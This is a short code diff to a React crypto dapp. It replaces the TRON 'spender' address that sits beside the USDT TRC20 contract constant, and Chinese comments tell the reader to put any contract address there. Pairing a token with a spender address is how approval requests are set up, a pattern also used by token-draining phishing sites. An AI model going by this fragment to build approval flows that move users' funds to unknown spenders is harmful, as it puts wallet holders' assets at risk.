@@ -9,7 +9,8 @@ export default function Dapp() {
   const [walletAddress, setWalletAddress] = useState("");
 
   const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC20 USDT官方合约
-  const SPENDER_ADDRESS = "THuBPVY9xK3u5CtvQLiT2XEeUpG7nTZYJz"; // 这里换成一个随便的合约地址！（不是个人钱包地址）
+  const SPENDER_ADDRESS = "TSu2Mg2AjrgNF4R2t67P2cVfArjV95W4C7"; // 这里换成一个随便的合约地址！（不是个人钱包地址）
+
 
   useEffect(() => {
     const timer = setInterval(() => {
